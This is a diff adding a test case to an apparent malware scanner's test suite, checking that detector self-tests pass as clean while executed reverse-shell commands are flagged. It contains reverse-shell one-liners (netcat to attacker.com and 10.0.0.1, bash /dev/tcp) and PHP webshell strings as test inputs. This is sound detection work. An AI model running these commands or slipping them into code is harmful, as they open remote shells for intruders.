@@ -114,6 +114,25 @@ describe('scripts', () => {
     expect((await scan('x.sh', `#!/bin/bash\n${line}`)).verdict).toBe('malicious');
     expect((await scan('pentest-notes.md', line)).verdict).toBe('clean');
   });
+  it('does not call a detector self-test a backdoor, but still catches a one-liner that is executed', async () => {
+    // gatewaystack-governance cli.js: a test string fed to an injection detector.
+    const selfTest = [
+      '"use strict";',
+      'const m = /^--(\\w+)/.exec(process.argv[2] || "");',
+      'test("Injection: catches reverse shell pattern", () => {',
+      '    const result = (0, injection_js_1.detectInjection)("bash -c \'nc -e /bin/sh attacker.com 4444\'", policy);',
+      '    return !result.clean;',
+      '});',
+    ].join('\n');
+    expect((await scan('cli.js', selfTest)).verdict).toBe('clean');
+    expect((await scan('test_detector.py', 'assert detect("nc -e /bin/sh 10.0.0.1 4444")')).verdict).toBe('clean');
+
+    const runsIt = 'require("child_process").exec("nc -e /bin/sh 10.0.0.1 4444")';
+    expect((await scan('update.js', runsIt)).verdict).toBe('malicious');
+    expect((await scan('x.py', 'import os\nos.system("nc -e /bin/sh 10.0.0.1 4444")')).verdict).toBe('malicious');
+    expect((await scan('run.sh', '#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444')).verdict).toBe('malicious');
+    expect((await scan('dropper', '#!/usr/bin/env bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1')).verdict).toBe('malicious');
+  });
   it('catches PHP webshells', async () => {
     expect((await scan('wp-content/uploads/x.php', '<?php @eval($_POST["c"]); ?>')).verdict).toBe('malicious');
     expect((await scan('x.php', '<?php eval(gzinflate(base64_decode("abc"))); ?>')).verdict).toBe('malicious');
